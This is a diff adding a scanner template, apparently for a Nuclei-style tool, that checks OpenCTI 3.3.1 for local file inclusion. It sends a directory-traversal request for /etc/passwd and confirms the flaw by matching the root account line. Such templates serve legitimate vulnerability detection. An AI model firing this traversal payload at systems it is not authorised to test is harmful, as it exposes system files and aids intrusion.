@@ -1,0 +1,22 @@
+id: opencti-lfi
+name: OpenCTI 3.3.1 - Local File Inclusion
+severity: high
+confidence: confirmed
+description: OpenCTI 3.3.1 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- opencti
+- lfi
+- oss
+- vuln
+requests:
+- method: GET
+  path: /static/css//../../../../../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - root:[x*]:0:0
+  - type: status
+    status:
+    - 200
+  condition: and
